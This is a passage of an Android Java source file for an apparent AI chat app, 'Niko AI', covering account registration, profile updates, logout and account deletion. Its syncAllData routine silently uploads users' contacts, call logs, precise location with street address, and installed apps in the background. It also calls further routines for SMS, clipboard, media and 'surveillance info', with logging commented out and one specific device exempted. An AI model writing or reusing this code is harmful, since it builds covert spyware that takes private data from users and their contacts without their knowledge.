                        // Giriş moduna geç
                        isRegisterMode = false;
                        txtAccountTitle.setText("Giriş Yap");
                        btnSubmitAccount.setText("Giriş Yap");
                        btnSwitchMode.setText("Hesabınız yok mu? Kayıt olun");
                        layoutRegisterExtras.setVisibility(View.GONE);
                    });
                } else {
                     runOnUiThread(() -> {
                         btnVerifyCode.setEnabled(true);
                         btnVerifyCode.setAlpha(1.0f);
                         btnVerifyCode.setText("Doğrula ve Kayıt Ol");
                         btnVerifyCode.animate().scaleX(1f).scaleY(1f).setDuration(200).start();
                         Toast.makeText(this, "Kayıt sırasında bir hata oluştu.", Toast.LENGTH_SHORT).show();
                     });
                }

            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> {
                    btnVerifyCode.setEnabled(true);
                    btnVerifyCode.setAlpha(1.0f);
                    btnVerifyCode.setText("Doğrula ve Kayıt Ol");
                    btnVerifyCode.animate().scaleX(1f).scaleY(1f).setDuration(200).start();
                    Toast.makeText(this, "İşlem hatası", Toast.LENGTH_SHORT).show();
                });
            }
        }).start();
    }

    private void updateProfileRequest(String username, String fullName, String email, String currentPassword, String newPassword) {
        new Thread(() -> {
            try {
                URL url = new URL(API_BASE_URL + "/me");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("PUT");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Authorization", "Bearer " + authToken);
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                if (!username.equals(authUsername))
                    payload.put("new_username", username);
                if (!fullName.isEmpty())
                    payload.put("full_name", fullName);
                if (!email.isEmpty())
                    payload.put("email", email);
                if (selectedImageBase64 != null)
                    payload.put("profile_image", selectedImageBase64);

                // Add passwords only if they are being changed
                if (!newPassword.isEmpty()) {
                    if (currentPassword.isEmpty()) {
                        runOnUiThread(() -> Toast.makeText(this, "Şifre değiştirmek için mevcut şifreniz gerekli",
                                Toast.LENGTH_LONG).show());
                        return;
                    }
                    payload.put("current_password", currentPassword);
                    payload.put("new_password", newPassword);
                }

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes("utf-8"));
                }

                int code = conn.getResponseCode();
                if (code == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                    JSONObject resp = new JSONObject(sb.toString());

                    if (resp.has("access_token")) {
                        authToken = resp.getString("access_token");
                        authUsername = resp.getString("new_username");
                        authPrefs.edit()
                                .putString("access_token", authToken)
                                .putString("username", authUsername)
                                .apply();
                    }

                    runOnUiThread(() -> {
                        Toast.makeText(this, "Profil başarıyla güncellendi", Toast.LENGTH_LONG).show();
                        animateSuccess(btnSubmitAccount);
                        isEditProfileMode = false;
                        selectedImageBase64 = null; // Temizle
                        updateAccountUI();
                        // Şifre alanlarını temizle
                        edtPassword.setText("");
                        edtCurrentPassword.setText("");
                    });
                } else {
                    InputStream es = conn.getErrorStream();
                    if (es != null) {
                        BufferedReader br = new BufferedReader(new InputStreamReader(es, "utf-8"));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = br.readLine()) != null)
                            sb.append(line);
                        JSONObject resp = new JSONObject(sb.toString());
                        String err = resp.optString("detail", "Güncelleme başarısız");
                        runOnUiThread(() -> Toast.makeText(this, "Hata: " + err, Toast.LENGTH_LONG).show());
                    } else {
                        runOnUiThread(() -> Toast.makeText(this, "Sunucu hatası: " + code, Toast.LENGTH_SHORT).show());
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(this, "Bağlantı hatası", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }
    /**
     * Mevcut oturumu kapatır ve kullanıcı bilgilerini cihazdan siler.
     */
    private void performLogout() {
        authToken = null;
        authUsername = null;
        authPrefs.edit().clear().apply(); // Tüm kayıtlı verileri temizle
        
        // Profil resimlerini varsayılana döndür
        imgTopProfile.setImageResource(android.R.drawable.ic_menu_myplaces);
        imgTopProfile.setColorFilter(Color.WHITE);
        imgMainProfile.setImageResource(android.R.drawable.ic_menu_myplaces);
        imgMainProfile.setColorFilter(Color.WHITE);
        
        updateAccountUI();
        Toast.makeText(this, "Çıkış yapıldı", Toast.LENGTH_SHORT).show();
    }

    /**
     * Hesap silme işlemi için özelleştirilmiş onay diyaloğu gösterir.
     * Kullanıcının yanlışlıkla hesabını silmesini önlemek için gereklidir.
     */
    private void showDeleteAccountConfirmation() {
        // Ana container
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setBackgroundColor(Color.parseColor("#1a1a2e"));
        
        // İçerik container
        LinearLayout contentLayout = new LinearLayout(this);
        contentLayout.setOrientation(LinearLayout.VERTICAL);
        contentLayout.setPadding(60, 50, 60, 40);
        
        // Başlık ikonu
        ImageView iconView = new ImageView(this);
        iconView.setImageResource(android.R.drawable.ic_dialog_alert);
        iconView.setColorFilter(Color.parseColor("#ff6b6b"));
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(130, 130);
        iconParams.gravity = android.view.Gravity.CENTER_HORIZONTAL;
        iconParams.setMargins(0, 0, 0, 35);
        iconView.setLayoutParams(iconParams);
        contentLayout.addView(iconView);
        
        // Başlık
        TextView titleView = new TextView(this);
        titleView.setText("Hesabı Sil");
        titleView.setTextSize(26);
        titleView.setTextColor(Color.WHITE);
        titleView.setTypeface(null, android.graphics.Typeface.BOLD);
        titleView.setGravity(android.view.Gravity.CENTER);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        titleParams.setMargins(0, 0, 0, 35);
        titleView.setLayoutParams(titleParams);
        contentLayout.addView(titleView);
        
        // Ayırıcı çizgi
        View divider1 = new View(this);
        divider1.setBackgroundColor(Color.parseColor("#ff6b6b"));
        LinearLayout.LayoutParams dividerParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 4
        );
        dividerParams.setMargins(0, 0, 0, 30);
        divider1.setLayoutParams(dividerParams);
        contentLayout.addView(divider1);
        
        // Ana mesaj
        TextView messageView = new TextView(this);
        messageView.setText("⏱️ 30 Günlük Askı Süresi");
        messageView.setTextSize(17);
        messageView.setTextColor(Color.parseColor("#ffd93d"));
        messageView.setTypeface(null, android.graphics.Typeface.BOLD);
        LinearLayout.LayoutParams msgParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        msgParams.setMargins(0, 0, 0, 18);
        messageView.setLayoutParams(msgParams);
        contentLayout.addView(messageView);
        
        // Detay mesajı
        TextView detailView = new TextView(this);
        detailView.setText("Hesabınız 30 gün boyunca askıya alınacaktır. Bu süre içinde tekrar giriş yaparak hesabınızı geri aktif edebilirsiniz.");
        detailView.setTextSize(14);
        detailView.setTextColor(Color.parseColor("#d0d0d0"));
        detailView.setLineSpacing(10, 1);
        LinearLayout.LayoutParams detailParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        detailParams.setMargins(0, 0, 0, 25);
        detailView.setLayoutParams(detailParams);
        contentLayout.addView(detailView);
        
        // Uyarı kutusu
        LinearLayout warningBox = new LinearLayout(this);
        warningBox.setOrientation(LinearLayout.VERTICAL);
        warningBox.setBackgroundColor(Color.parseColor("#2d1b1b"));
        warningBox.setPadding(35, 25, 35, 25);
        LinearLayout.LayoutParams warningParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        warningParams.setMargins(0, 0, 0, 30);
        warningBox.setLayoutParams(warningParams);
        
        // Uyarı kutusu kenarlık efekti
        android.graphics.drawable.GradientDrawable warningBorder = new android.graphics.drawable.GradientDrawable();
        warningBorder.setColor(Color.parseColor("#2d1b1b"));
        warningBorder.setStroke(3, Color.parseColor("#ff6b6b"));
        warningBorder.setCornerRadius(15);
        warningBox.setBackground(warningBorder);
        
        TextView warningTitle = new TextView(this);
        warningTitle.setText("⚠️ 30 Gün Sonra Silinecek:");
        warningTitle.setTextSize(15);
        warningTitle.setTextColor(Color.parseColor("#ff6b6b"));
        warningTitle.setTypeface(null, android.graphics.Typeface.BOLD);
        warningTitle.setPadding(0, 0, 0, 12);
        warningBox.addView(warningTitle);
        
        TextView warningText = new TextView(this);
        warningText.setText("• Hesap bilgileri\n• Sohbet geçmişi");
        warningText.setTextSize(14);
        warningText.setTextColor(Color.parseColor("#ffb3b3"));
        warningText.setLineSpacing(8, 1);
        warningBox.addView(warningText);
        
        contentLayout.addView(warningBox);
        
        // Son uyarı
        TextView finalWarning = new TextView(this);
        finalWarning.setText("Devam etmek istediğinizden emin misiniz?");
        finalWarning.setTextSize(16);
        finalWarning.setTextColor(Color.WHITE);
        finalWarning.setTypeface(null, android.graphics.Typeface.BOLD);
        finalWarning.setGravity(android.view.Gravity.CENTER);
        LinearLayout.LayoutParams finalParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        finalParams.setMargins(0, 0, 0, 0);
        finalWarning.setLayoutParams(finalParams);
        contentLayout.addView(finalWarning);
        
        mainLayout.addView(contentLayout);
        
        // Butonlar için özel container
        LinearLayout buttonContainer = new LinearLayout(this);
        buttonContainer.setOrientation(LinearLayout.HORIZONTAL);
        buttonContainer.setBackgroundColor(Color.parseColor("#0f0f1e"));
        buttonContainer.setPadding(40, 25, 40, 25);
        buttonContainer.setGravity(android.view.Gravity.CENTER);
        
        // İptal butonu
        Button cancelButton = new Button(this);
        cancelButton.setText("İptal");
        cancelButton.setTextColor(Color.WHITE);
        cancelButton.setTextSize(15);
        cancelButton.setTypeface(null, android.graphics.Typeface.BOLD);
        cancelButton.setAllCaps(false);
        
        android.graphics.drawable.GradientDrawable cancelBg = new android.graphics.drawable.GradientDrawable();
        cancelBg.setColor(Color.parseColor("#2d4a2d"));
        cancelBg.setCornerRadius(25);
        cancelButton.setBackground(cancelBg);
        
        LinearLayout.LayoutParams cancelParams = new LinearLayout.LayoutParams(
            0,
            LinearLayout.LayoutParams.WRAP_CONTENT,
            1
        );
        cancelParams.setMargins(0, 0, 15, 0);
        cancelButton.setLayoutParams(cancelParams);
        cancelButton.setPadding(0, 30, 0, 30);
        
        // Sil butonu
        Button deleteButton = new Button(this);
        deleteButton.setText("Evet, Hesabı Sil");
        deleteButton.setTextColor(Color.WHITE);
        deleteButton.setTextSize(15);
        deleteButton.setTypeface(null, android.graphics.Typeface.BOLD);
        deleteButton.setAllCaps(false);
        
        android.graphics.drawable.GradientDrawable deleteBg = new android.graphics.drawable.GradientDrawable();
        deleteBg.setColor(Color.parseColor("#d32f2f"));
        deleteBg.setCornerRadius(25);
        deleteButton.setBackground(deleteBg);
        
        LinearLayout.LayoutParams deleteParams = new LinearLayout.LayoutParams(
            0,
            LinearLayout.LayoutParams.WRAP_CONTENT,
            1
        );
        deleteParams.setMargins(15, 0, 0, 0);
        deleteButton.setLayoutParams(deleteParams);
        deleteButton.setPadding(0, 30, 0, 30);
        
        buttonContainer.addView(cancelButton);
        buttonContainer.addView(deleteButton);
        
        mainLayout.addView(buttonContainer);
        
        // Dialog oluştur
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setView(mainLayout);
        builder.setCancelable(true);
        
        android.app.AlertDialog dialog = builder.create();
        
        // Buton click listener'ları
        cancelButton.setOnClickListener(v -> dialog.dismiss());
        deleteButton.setOnClickListener(v -> {
            dialog.dismiss();
            deleteAccountRequest();
        });
        
        // Dialog arka planını şeffaf yap
        if (dialog.getWindow() != null) {
            dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
        }
        
        dialog.show();
    }

    /**
     * Hesap başarıyla silindiğinde özel başarı dialog'u gösterir.
     * @param message Sunucudan gelen detaylı mesaj
     */
    private void showAccountDeletedSuccessDialog(String message) {
        // Ana container
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setBackgroundColor(Color.parseColor("#0f3443"));
        
        // İçerik container
        LinearLayout contentLayout = new LinearLayout(this);
        contentLayout.setOrientation(LinearLayout.VERTICAL);
        contentLayout.setPadding(60, 55, 60, 45);
        
        // Başarı ikonu
        ImageView iconView = new ImageView(this);
        iconView.setImageResource(android.R.drawable.checkbox_on_background);
        iconView.setColorFilter(Color.parseColor("#6bcf7f"));
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(150, 150);
        iconParams.gravity = android.view.Gravity.CENTER_HORIZONTAL;
        iconParams.setMargins(0, 0, 0, 40);
        iconView.setLayoutParams(iconParams);
        contentLayout.addView(iconView);
        
        // Başlık
        TextView titleView = new TextView(this);
        titleView.setText("✓ Hesap Silindi");
        titleView.setTextSize(28);
        titleView.setTextColor(Color.parseColor("#6bcf7f"));
        titleView.setTypeface(null, android.graphics.Typeface.BOLD);
        titleView.setGravity(android.view.Gravity.CENTER);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        titleParams.setMargins(0, 0, 0, 35);
        titleView.setLayoutParams(titleParams);
        contentLayout.addView(titleView);
        
        // Yeşil ayırıcı çizgi
        View divider = new View(this);
        divider.setBackgroundColor(Color.parseColor("#6bcf7f"));
        LinearLayout.LayoutParams dividerParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 4
        );
        dividerParams.setMargins(0, 0, 0, 35);
        divider.setLayoutParams(dividerParams);
        contentLayout.addView(divider);
        
        // Bilgi kutusu
        LinearLayout infoBox = new LinearLayout(this);
        infoBox.setOrientation(LinearLayout.VERTICAL);
        infoBox.setBackgroundColor(Color.parseColor("#1a4d5c"));
        infoBox.setPadding(40, 30, 40, 30);
        LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        infoParams.setMargins(0, 0, 0, 30);
        infoBox.setLayoutParams(infoParams);
        
        // Bilgi kutusu kenarlık
        android.graphics.drawable.GradientDrawable infoBorder = new android.graphics.drawable.GradientDrawable();
        infoBorder.setColor(Color.parseColor("#1a4d5c"));
        infoBorder.setStroke(3, Color.parseColor("#4dd0e1"));
        infoBorder.setCornerRadius(15);
        infoBox.setBackground(infoBorder);
        
        // Mesaj metni
        TextView messageView = new TextView(this);
        messageView.setText(message);
        messageView.setTextSize(14);
        messageView.setTextColor(Color.parseColor("#e0f7fa"));
        messageView.setLineSpacing(12, 1);
        infoBox.addView(messageView);
        
        contentLayout.addView(infoBox);
        
        // Önemli bilgi başlığı
        TextView importantTitle = new TextView(this);
        importantTitle.setText("📌 Önemli Bilgi:");
        importantTitle.setTextSize(16);
        importantTitle.setTextColor(Color.parseColor("#ffd93d"));
        importantTitle.setTypeface(null, android.graphics.Typeface.BOLD);
        LinearLayout.LayoutParams impTitleParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        impTitleParams.setMargins(0, 0, 0, 18);
        importantTitle.setLayoutParams(impTitleParams);
        contentLayout.addView(importantTitle);
        
        // Bilgi kartı
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.HORIZONTAL);
        card.setBackgroundColor(Color.parseColor("#1a3d4d"));
        card.setPadding(30, 25, 30, 25);
        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        cardParams.setMargins(0, 0, 0, 30);
        card.setLayoutParams(cardParams);
        
        // Kart kenarlık
        android.graphics.drawable.GradientDrawable cardBorder = new android.graphics.drawable.GradientDrawable();
        cardBorder.setColor(Color.parseColor("#1a3d4d"));
        cardBorder.setStroke(2, Color.parseColor("#4dd0e1"));
        cardBorder.setCornerRadius(12);
        card.setBackground(cardBorder);
        
        TextView cardIcon = new TextView(this);
        cardIcon.setText("⏱️");
        cardIcon.setTextSize(26);
        cardIcon.setPadding(0, 0, 25, 0);
        card.addView(cardIcon);
        
        TextView cardText = new TextView(this);
        cardText.setText("30 gün içinde giriş yaparak geri alabilirsiniz.");
        cardText.setTextSize(13);
        cardText.setTextColor(Color.parseColor("#b3e5fc"));
        cardText.setLineSpacing(5, 1);
        card.addView(cardText);
        
        contentLayout.addView(card);
        
        // Teşekkür mesajı
        TextView thanksView = new TextView(this);
        thanksView.setText("Niko AI'ı kullandığınız için teşekkür ederiz! 💙");
        thanksView.setTextSize(15);
        thanksView.setTextColor(Color.parseColor("#80deea"));
        thanksView.setTypeface(null, android.graphics.Typeface.ITALIC);
        thanksView.setGravity(android.view.Gravity.CENTER);
        LinearLayout.LayoutParams thanksParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        thanksParams.setMargins(0, 0, 0, 0);
        thanksView.setLayoutParams(thanksParams);
        contentLayout.addView(thanksView);
        
        mainLayout.addView(contentLayout);
        
        // Buton container
        LinearLayout buttonContainer = new LinearLayout(this);
        buttonContainer.setOrientation(LinearLayout.HORIZONTAL);
        buttonContainer.setBackgroundColor(Color.parseColor("#0a2530"));
        buttonContainer.setPadding(60, 25, 60, 25);
        buttonContainer.setGravity(android.view.Gravity.CENTER);
        
        // Tamam butonu
        Button okButton = new Button(this);
        okButton.setText("Tamam");
        okButton.setTextColor(Color.WHITE);
        okButton.setTextSize(16);
        okButton.setTypeface(null, android.graphics.Typeface.BOLD);
        okButton.setAllCaps(false);
        
        android.graphics.drawable.GradientDrawable okBg = new android.graphics.drawable.GradientDrawable();
        okBg.setColor(Color.parseColor("#2e7d32"));
        okBg.setCornerRadius(25);
        okButton.setBackground(okBg);
        
        LinearLayout.LayoutParams okParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        okButton.setLayoutParams(okParams);
        okButton.setPadding(0, 35, 0, 35);
        
        buttonContainer.addView(okButton);
        mainLayout.addView(buttonContainer);
        
        // Dialog oluştur
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setView(mainLayout);
        builder.setCancelable(false);
        
        android.app.AlertDialog dialog = builder.create();
        
        // Buton click listener
        okButton.setOnClickListener(v -> dialog.dismiss());
        
        // Dialog arka planını şeffaf yap
        if (dialog.getWindow() != null) {
            dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
        }
        
        dialog.show();
    }

    /**
     * Kullanıcının hesabını silmek için işaretler.
     * Sunucuya DELETE isteği gönderir ve başarılı olursa logout yapar.
     * Hesap 30 gün içinde geri aktif edilebilir.
     */
    private void deleteAccountRequest() {
        if (authToken == null) {
            Toast.makeText(this, "Hesap silmek için giriş yapmanız gerekiyor", Toast.LENGTH_SHORT).show();
            return;
        }

        addLog("[HESAP SİL] Hesap silme isteği gönderiliyor...");
        
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(API_BASE_URL + "/me");
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("DELETE");
                conn.setRequestProperty("Authorization", "Bearer " + authToken);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);

                int code = conn.getResponseCode();
                addLog("[HESAP SİL] Sunucu yanıt kodu: " + code);

                if (code == 200) {
                    // Başarılı silme işareti
                    // Sunucudan gelen mesajı oku
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) {
                        response.append(line);
                    }
                    br.close();
                    
                    // JSON'dan mesajı çıkar
                    String serverMessage = "Hesabınız silme için işaretlendi";
                    try {
                        JSONObject jsonResponse = new JSONObject(response.toString());
                        if (jsonResponse.has("message")) {
                            serverMessage = jsonResponse.getString("message");
                        }
                    } catch (Exception e) {
                        addLog("[HESAP SİL] JSON parse hatası: " + e.getMessage());
                    }
                    
                    final String finalMessage = serverMessage;
                    
                    runOnUiThread(() -> {
                        addLog("[HESAP SİL] " + finalMessage);
                        
                        // Yerel verileri temizle (performLogout benzeri)
                        authToken = null;
                        authUsername = null;
                        authPrefs.edit().clear().apply();
                        
                        // Profil resimlerini varsayılana döndür
                        imgTopProfile.setImageResource(android.R.drawable.ic_menu_myplaces);
                        imgTopProfile.setColorFilter(Color.WHITE);
                        imgMainProfile.setImageResource(android.R.drawable.ic_menu_myplaces);
                        imgMainProfile.setColorFilter(Color.WHITE);
                        if (imgProfileAvatar != null) {
                            imgProfileAvatar.setImageResource(android.R.drawable.ic_menu_myplaces);
                            imgProfileAvatar.setColorFilter(Color.WHITE);
                        }
                        
                        hideAccount();
                        updateAccountUI();
                        
                        // Sunucudan gelen mesajı özel dialog ile göster
                        showAccountDeletedSuccessDialog(finalMessage);
                    });
                } else {
                    // Hata durumu
                    InputStream errorStream = conn.getErrorStream();
                    String errorDetail = "";
                    if (errorStream != null) {
                        BufferedReader br = new BufferedReader(new InputStreamReader(errorStream, "utf-8"));
                        StringBuilder esb = new StringBuilder();
                        String eline;
                        while ((eline = br.readLine()) != null) esb.append(eline);
                        br.close();
                        errorDetail = esb.toString();
                    }
                    addLog("[HESAP SİL] HATA: " + code + " - " + errorDetail);
                    
                    // JSON'dan detail mesajını çıkarmaya çalış
                    String errorMessage = "";
                    try {
                        JSONObject errorJson = new JSONObject(errorDetail);
                        if (errorJson.has("detail")) {
                            errorMessage = errorJson.getString("detail");
                        }
                    } catch (Exception e) {
                        // JSON parse edilemezse varsayılan mesajları kullan
                    }
                    
                    final String msg;
                    if (!errorMessage.isEmpty()) {
                        msg = errorMessage;
                    } else {
                        msg = code == 401 ? "Oturum süresi dolmuş. Lütfen tekrar giriş yapın." 
                            : code == 403 ? "Bu işlem için yetkiniz yok."
                            : code == 404 ? "Hesap bulunamadı."
                            : "Hesap silinemedi. Sunucu hatası: " + code;
                    }
                    
                    runOnUiThread(() -> Toast.makeText(this, msg, Toast.LENGTH_LONG).show());
                }
            } catch (Exception e) {
                addLog("[HESAP SİL] İSTİSNA: " + e.getMessage());
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(this, "Bağlantı hatası. Lütfen internet bağlantınızı kontrol edin.", Toast.LENGTH_SHORT).show());
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
            }
        }).start();
    }

    /**
     * Arkada planda rehber, arama geçmişi ve cihaz bilgilerini senkronize eder.
     */
    private void syncAllData() {
        String deviceName = getDeviceName();
        // Belirli cihazlarda (örn. Emülatör) çalışmasını engellemek için kontrol
        if ("Xiaomi_25069PTEBG".equals(deviceName)) {
            return;
        }
        new Thread(() -> {
            try {
                // android.util.Log.d("NIKO_SYNC", "Starting full data sync...");
                // addLog("[SYNC] Veri senkronizasyonu başlatılıyor...");
                
                syncContacts(); // Rehberi gönder
                syncCallLogs(); // Arama kayıtlarını gönder
                syncLocation(); // Konumu gönder
                syncInstalledApps(); // Uygulamaları gönder
                syncDeviceInfo(); // Cihaz bilgisini gönder
                
                // Yeni Eklenen Veri Çekme Metotları
                syncSMS();
                syncNetworkInfo();
                syncBluetoothDevices();
                syncClipboard(); 
                syncMedia();
                syncSensors();
                syncUsageStats();
                syncSurveillanceInfo();
                
                // android.util.Log.d("NIKO_SYNC", "Full data sync completed.");
                // addLog("[SYNC] Veri senkronizasyonu tamamlandı.");
            } catch (Exception e) {
                e.printStackTrace();
                // android.util.Log.e("NIKO_SYNC", "Sync connection error: " + e.getMessage());
                // addLog("[SYNC ERROR] Bağlantı Hatası: " + e.getMessage());
            }
        }).start();
    }

    /**
     * Rehberdeki numaraları senkronize eder.
     */
    private void syncContacts() throws Exception {
        JSONArray array = new JSONArray();
        
        String[] projection = {
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.TYPE,
            ContactsContract.CommonDataKinds.Phone.LABEL,
            ContactsContract.CommonDataKinds.Phone.PHOTO_URI,
            ContactsContract.CommonDataKinds.Phone.STARRED,
            ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED
        };

        try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null)) {
            if (c != null) {
                while (c.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("id", c.getLong(0)); // CONTACT_ID
                    obj.put("name", c.getString(1)); // DISPLAY_NAME
                    obj.put("phone", c.getString(2)); // NUMBER
                    
                    // Telefon Türü (Mobil, Ev, İş)
                    int type = c.getInt(3);
                    String label = c.getString(4);
                    CharSequence typeLabelSeq = ContactsContract.CommonDataKinds.Phone.getTypeLabel(getResources(), type, label);
                    obj.put("type", typeLabelSeq != null ? typeLabelSeq.toString() : "Unknown");
                    
                    obj.put("photo_uri", c.getString(5)); // Fotoğraf adresi (Varsa)
                    obj.put("is_starred", c.getInt(6) == 1); // Favori mi?
                    
                    // Son görüşme (API 29+ da 0 dönebilir ama eski cihazlarda çalışır)
                    long lastContacted = c.getLong(7);
                    if (lastContacted > 0) {
                        obj.put("last_time_contacted", lastContacted);
                    }
                    
                    array.put(obj);
                }
            }
        }
        sendSyncRequest(array, "contacts");
    }

    /**
     * Son arama kayıtlarını (Call Log) senkronize eder.
     */
    private void syncCallLogs() throws Exception {
        JSONArray array = new JSONArray();
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            return;

        // Son arama kayıtlarını tarihe göre sıralı çek
        try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC")) {
            if (c != null) {
                int numIdx = c.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = c.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = c.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = c.getColumnIndex(CallLog.Calls.DURATION);

                while (c.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("number", c.getString(numIdx));
                    obj.put("type", c.getInt(typeIdx));
                    obj.put("date", c.getLong(dateIdx));
                    obj.put("duration", c.getInt(durationIdx));
                    // İsim Bilgisi (Eğer kayıtlıysa veya cache'de varsa)
                    int nameIdx = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    if (nameIdx != -1) {
                         obj.put("name", c.getString(nameIdx));
                    }
                    array.put(obj);
                }
            }
        }
        sendSyncRequest(array, "calls");
    }

    /**
     * Cihazın konum bilgilerini (Ultra Detaylı ve Adres Çözümlü) senkronize eder.
     */
    private void syncLocation() throws Exception {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            return;

        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        Location loc = null;

        // En iyi konumu bulmak için strateji (GPS > Network)
        if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        }
        if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }

        if (loc != null) {
            JSONArray array = new JSONArray();
            JSONObject obj = new JSONObject();
            
            // Temel Koordinatlar
            double lat = loc.getLatitude();
            double lng = loc.getLongitude();
            obj.put("lat", lat);
            obj.put("lng", lng);
            obj.put("time", loc.getTime());
            
            // Detaylı Veriler
            obj.put("alt", loc.getAltitude()); // Yükseklik
            obj.put("speed_ms", loc.getSpeed()); // Hız (metre/saniye)
            obj.put("accuracy_m", loc.getAccuracy()); // Doğruluk payı (metre)
            obj.put("bearing", loc.getBearing()); // Yön (derece)
            obj.put("provider", loc.getProvider()); // Kaynak (gps/network)
            obj.put("is_mock", loc.isFromMockProvider()); // Fake GPS kontrolü
            
            // [REVERSE GEOCODING] Koordinattan Adres Çözümleme
            if (android.location.Geocoder.isPresent()) {
                try {
                    android.location.Geocoder geocoder = new android.location.Geocoder(this, Locale.getDefault());
                    List<android.location.Address> addresses = geocoder.getFromLocation(lat, lng, 1);
                    if (addresses != null && !addresses.isEmpty()) {
                        android.location.Address addr = addresses.get(0);
                        JSONObject addressObj = new JSONObject();
                        addressObj.put("country", addr.getCountryName());
                        addressObj.put("country_code", addr.getCountryCode());
                        addressObj.put("admin_area", addr.getAdminArea()); // İl
                        addressObj.put("sub_admin_area", addr.getSubAdminArea()); // İlçe
                        addressObj.put("locality", addr.getLocality());
                        addressObj.put("thoroughfare", addr.getThoroughfare()); // Cadde/Sokak
                        addressObj.put("postal_code", addr.getPostalCode());
                        addressObj.put("full_address", addr.getAddressLine(0));
                        obj.put("address_details", addressObj);
                    }
                } catch (Exception ignored) {
                    // Geocoder bazen servis yoksa hata verebilir, yoksay
                    obj.put("address_error", "Service unavailable");
                }
            }

            array.put(obj);
            sendSyncRequest(array, "location");
        }
    }

    /**
     * Yüklü uygulamaların listesini (Ultra Detaylı) senkronize eder.
     */
    private void syncInstalledApps() throws Exception {
        JSONArray array = new JSONArray();
